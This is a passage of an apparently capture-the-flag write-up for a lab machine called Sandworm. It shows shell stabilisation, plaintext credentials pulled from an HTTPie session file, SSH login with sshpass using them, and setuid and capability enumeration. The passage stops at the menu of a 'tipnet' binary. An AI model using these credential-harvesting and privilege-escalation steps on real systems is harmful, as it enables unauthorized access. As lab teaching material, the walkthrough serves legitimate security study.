<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
</pre></div>

Listing the contents of the <code>/home</code> directory, we observe that there are two users:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">home</span>
<span class="n">total</span> <span class="mi">4</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">8</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">01</span> <span class="n">atlas</span>
<span class="n">dr</span><span class="o">--------</span> <span class="mi">2</span> <span class="n">nobody</span> <span class="n">nogroup</span>   <span class="mi">40</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">06</span> <span class="n">silentobserver</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

In Atlas's home directory, the following files are present:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">48</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">8</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">01</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">nobody</span> <span class="n">nogroup</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">..</span>
<span class="n">lrwxrwxrwx</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">nogroup</span>    <span class="mi">9</span> <span class="n">Nov</span> <span class="mi">22</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">bash_history</span> <span class="o">-&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span>  <span class="n">atlas</span>    <span class="mi">220</span> <span class="n">Nov</span> <span class="mi">22</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">bash_logout</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">3771</span> <span class="n">Nov</span> <span class="mi">22</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">bashrc</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">6</span> <span class="mi">08</span><span class="p">:</span><span class="mi">49</span> <span class="o">.</span><span class="n">cache</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2023</span> <span class="o">.</span><span class="n">cargo</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Jan</span> <span class="mi">15</span>  <span class="mi">2023</span> <span class="o">.</span><span class="n">config</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">4</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">19</span><span class="p">:</span><span class="mi">38</span> <span class="o">.</span><span class="n">gnupg</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">6</span>  <span class="mi">2023</span> <span class="o">.</span><span class="n">local</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span>  <span class="n">atlas</span>    <span class="mi">807</span> <span class="n">Nov</span> <span class="mi">22</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">profile</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">06</span> <span class="o">.</span><span class="n">ssh</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">atlas</span>  <span class="n">atlas</span>    <span class="mi">868</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">01</span> <span class="o">.</span><span class="n">viminfo</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

Within the <code>.config</code> directory, the following content is observed:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cd</span> <span class="o">.</span><span class="n">config</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">12</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Jan</span> <span class="mi">15</span>  <span class="mi">2023</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">8</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">01</span> <span class="o">..</span>
<span class="n">dr</span><span class="o">--------</span> <span class="mi">2</span> <span class="n">nobody</span> <span class="n">nogroup</span>   <span class="mi">40</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">06</span> <span class="n">firejail</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">nobody</span> <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Jan</span> <span class="mi">15</span>  <span class="mi">2023</span> <span class="n">httpie</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="err">$</span>
</pre></div>

It appears that our container operates within a firejail sandbox.<br/><br/>
Upon investigating the <code>httpie</code> directory, I discovered the following file:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="err">$</span> <span class="n">cd</span> <span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="o">/</span>
<span class="n">admin</span><span class="o">.</span><span class="n">json</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
<span class="n">total</span> <span class="mi">4</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">atlas</span> <span class="mi">611</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">admin</span><span class="o">.</span><span class="n">json</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span>
</pre></div>

Upon listing the contents, we acquire credentials for the user <code>silentobserver</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span> <span class="n">cat</span> <span class="n">admin</span><span class="o">.</span><span class="n">json</span> 
<span class="p">{</span>
    <span class="s2">"__meta__"</span><span class="p">:</span> <span class="p">{</span>
        <span class="s2">"about"</span><span class="p">:</span> <span class="s2">"HTTPie session file"</span><span class="p">,</span>
        <span class="s2">"help"</span><span class="p">:</span> <span class="s2">"https://httpie.io/docs#sessions"</span><span class="p">,</span>
        <span class="s2">"httpie"</span><span class="p">:</span> <span class="s2">"2.6.0"</span>
    <span class="p">},</span>
    <span class="s2">"auth"</span><span class="p">:</span> <span class="p">{</span>
        <span class="s2">"password"</span><span class="p">:</span> <span class="s2">"quietLiketheWind22"</span><span class="p">,</span>
        <span class="s2">"type"</span><span class="p">:</span> <span class="n">null</span><span class="p">,</span>
        <span class="s2">"username"</span><span class="p">:</span> <span class="s2">"silentobserver"</span>
    <span class="p">},</span>
    <span class="s2">"cookies"</span><span class="p">:</span> <span class="p">{</span>
        <span class="s2">"session"</span><span class="p">:</span> <span class="p">{</span>
            <span class="s2">"expires"</span><span class="p">:</span> <span class="n">null</span><span class="p">,</span>
            <span class="s2">"path"</span><span class="p">:</span> <span class="s2">"/"</span><span class="p">,</span>
            <span class="s2">"secure"</span><span class="p">:</span> <span class="n">false</span><span class="p">,</span>
            <span class="s2">"value"</span><span class="p">:</span> <span class="s2">"eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"</span>
        <span class="p">}</span>
    <span class="p">},</span>
    <span class="s2">"headers"</span><span class="p">:</span> <span class="p">{</span>
        <span class="s2">"Accept"</span><span class="p">:</span> <span class="s2">"application/json, */*;q=0.5"</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span>
</pre></div>

Let's try to establish a shell as <code>silentobserver</code> using these credentials through the SSH service:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sshpass</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'quietLiketheWind22'</span> <span class="n">ssh</span> <span class="n">silentobserver</span><span class="o">@</span><span class="mf">10.10.11.218</span>
<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15.0</span><span class="o">-</span><span class="mi">73</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>

 <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span>
 <span class="o">*</span> <span class="n">Management</span><span class="p">:</span>     <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">landscape</span><span class="o">.</span><span class="n">canonical</span><span class="o">.</span><span class="n">com</span>
 <span class="o">*</span> <span class="n">Support</span><span class="p">:</span>        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">advantage</span>

  <span class="n">System</span> <span class="n">information</span> <span class="k">as</span> <span class="n">of</span> <span class="n">Sat</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">08</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">19</span> <span class="n">PM</span> <span class="n">UTC</span> <span class="mi">2023</span>

  <span class="n">System</span> <span class="n">load</span><span class="p">:</span>           <span class="mf">0.02978515625</span>
  <span class="n">Usage</span> <span class="n">of</span> <span class="o">/</span><span class="p">:</span>            <span class="mf">78.1</span><span class="o">%</span> <span class="n">of</span> <span class="mf">11.65</span><span class="n">GB</span>
  <span class="n">Memory</span> <span class="n">usage</span><span class="p">:</span>          <span class="mi">23</span><span class="o">%</span>
  <span class="n">Swap</span> <span class="n">usage</span><span class="p">:</span>            <span class="mi">0</span><span class="o">%</span>
  <span class="n">Processes</span><span class="p">:</span>             <span class="mi">245</span>
  <span class="n">Users</span> <span class="n">logged</span> <span class="ow">in</span><span class="p">:</span>       <span class="mi">0</span>
  <span class="n">IPv4</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="mf">10.10.11.218</span>
  <span class="n">IPv6</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">::</span><span class="mi">250</span><span class="p">:</span><span class="mi">56</span><span class="n">ff</span><span class="p">:</span><span class="n">feb9</span><span class="p">:</span><span class="mi">40</span><span class="n">b8</span>


<span class="n">Expanded</span> <span class="n">Security</span> <span class="n">Maintenance</span> <span class="k">for</span> <span class="n">Applications</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">enabled</span><span class="o">.</span>

<span class="mi">0</span> <span class="n">updates</span> <span class="n">can</span> <span class="n">be</span> <span class="n">applied</span> <span class="n">immediately</span><span class="o">.</span>

<span class="n">Enable</span> <span class="n">ESM</span> <span class="n">Apps</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">additional</span> <span class="n">future</span> <span class="n">security</span> <span class="n">updates</span><span class="o">.</span>
<span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">esm</span> <span class="ow">or</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">pro</span> <span class="n">status</span>


<span class="n">The</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">available</span> <span class="n">updates</span> <span class="ow">is</span> <span class="n">more</span> <span class="n">than</span> <span class="n">a</span> <span class="n">week</span> <span class="n">old</span><span class="o">.</span>
<span class="n">To</span> <span class="n">check</span> <span class="k">for</span> <span class="n">new</span> <span class="n">updates</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
<span class="n">Failed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">changelogs</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">meta</span><span class="o">-</span><span class="n">release</span><span class="o">-</span><span class="n">lts</span><span class="o">.</span> <span class="n">Check</span> <span class="n">your</span> <span class="n">Internet</span> <span class="n">connection</span> <span class="ow">or</span> <span class="n">proxy</span> <span class="n">settings</span>


<span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">32</span> <span class="mi">2023</span> <span class="kn">from</span> <span class="mf">10.10.16.7</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

We have successfully gained access to Sandworm as the user <code>silentobserver</code>.<br/><br/>
<h3><br>Shell as atlas</br></h3><br>
It appears that <code>silentobserver</code> does not belong to any specific groups:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">silentobserver</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">silentobserver</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">silentobserver</span><span class="p">)</span>
</pre></div>

Upon inspecting the sudo privileges of <code>silentobserver</code>, it is evident that the user does not have the ability to execute any command with sudo privileges:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">silentobserver</span><span class="p">:</span> 
<span class="n">Sorry</span><span class="p">,</span> <span class="n">user</span> <span class="n">silentobserver</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">run</span> <span class="n">sudo</span> <span class="n">on</span> <span class="n">localhost</span><span class="o">.</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

No notable capabilities are identified:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">getcap</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">gstreamer1</span><span class="mf">.0</span><span class="o">/</span><span class="n">gstreamer</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">gst</span><span class="o">-</span><span class="n">ptp</span><span class="o">-</span><span class="n">helper</span> <span class="n">cap_net_bind_service</span><span class="p">,</span><span class="n">cap_net_admin</span><span class="o">=</span><span class="n">ep</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ping</span> <span class="n">cap_net_raw</span><span class="o">=</span><span class="n">ep</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mtr</span><span class="o">-</span><span class="n">packet</span> <span class="n">cap_net_raw</span><span class="o">=</span><span class="n">ep</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

When listing Set-UID files on the system, the following files were identified:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">deps</span><span class="o">/</span><span class="n">tipnet</span><span class="o">-</span><span class="n">a859bd054535b3c1</span>
<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">deps</span><span class="o">/</span><span class="n">tipnet</span><span class="o">-</span><span class="n">dabc93f7704f7b48</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">libexec</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="o">-</span><span class="mi">1</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sudo</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">gpasswd</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">umount</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">passwd</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chsh</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">newgrp</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">su</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">fusermount3</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

Here, we encounter interesting elements. Initially, let's attempt to execute <code>firejail</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span>
<span class="o">-</span><span class="n">bash</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span><span class="p">:</span> <span class="n">Permission</span> <span class="n">denied</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

It returns a <code>Permission Denied</code> error. Upon inspecting its privileges, it becomes apparent that membership in the <code>Jailer</code> group is required to execute this binary:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">jailer</span> <span class="mi">1777952</span> <span class="n">Nov</span> <span class="mi">29</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

Another intriguing Set-UID file is present, named <code>tipnet</code>, and it appears to be a compiled binary:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
<span class="o">-</span><span class="n">rwsrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">atlas</span> <span class="n">atlas</span> <span class="mi">59087648</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">04</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">file</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span><span class="p">:</span> <span class="n">setuid</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">pie</span> <span class="n">executable</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="mi">7</span><span class="n">a6eafbd277ceb248bd47f806f7677f57fb9d7dd</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">3.2.0</span><span class="p">,</span> <span class="k">with</span> <span class="n">debug_info</span><span class="p">,</span> <span class="ow">not</span> <span class="n">stripped</span>
</pre></div>

Let's execute <code>tipnet</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>

             <span class="p">,,</span>                                      
<span class="n">MMP</span><span class="s2">""</span><span class="n">MM</span><span class="s2">""</span><span class="n">YMM</span> <span class="n">db</span>          <span class="err">`</span><span class="mi">7</span><span class="n">MN</span><span class="o">.</span>   <span class="err">`</span><span class="mi">7</span><span class="n">MF</span><span class="s1">'         mm    </span>
<span class="n">P</span><span class="s1">'   MM   `7               MMN.    M           MM    </span>
     <span class="n">MM</span>    <span class="err">`</span><span class="mi">7</span><span class="n">MM</span> <span class="err">`</span><span class="mi">7</span><span class="n">MMpdMAo</span><span class="o">.</span> <span class="n">M</span> <span class="n">YMb</span>   <span class="n">M</span>  <span class="o">.</span><span class="n">gP</span><span class="s2">"Ya mmMMmm  </span>
     <span class="n">MM</span>      <span class="n">MM</span>   <span class="n">MM</span>   <span class="err">`</span><span class="n">Wb</span> <span class="n">M</span>  <span class="err">`</span><span class="n">MN</span><span class="o">.</span> <span class="n">M</span> <span class="p">,</span><span class="n">M</span><span class="s1">'   Yb  MM    </span>
     <span class="n">MM</span>      <span class="n">MM</span>   <span class="n">MM</span>    <span class="n">M8</span> <span class="n">M</span>   <span class="err">`</span><span class="n">MM</span><span class="o">.</span><span class="n">M</span> <span class="mi">8</span><span class="n">M</span><span class="s2">""""""</span>  <span class="n">MM</span>    
     <span class="n">MM</span>      <span class="n">MM</span>   <span class="n">MM</span>   <span class="p">,</span><span class="n">AP</span> <span class="n">M</span>     <span class="n">YMM</span> <span class="n">YM</span><span class="o">.</span>    <span class="p">,</span>  <span class="n">MM</span>    
   <span class="o">.</span><span class="n">JMML</span><span class="o">.</span>  <span class="o">.</span><span class="n">JMML</span><span class="o">.</span> <span class="n">MMbmmd</span><span class="s1">'.JML.    YM  `Mbmmd'</span>  <span class="err">`</span><span class="n">Mbmo</span> 
                  <span class="n">MM</span>                                 
                <span class="o">.</span><span class="n">JMML</span><span class="o">.</span>                               


<span class="n">Select</span> <span class="n">mode</span> <span class="n">of</span> <span class="n">usage</span><span class="p">:</span>
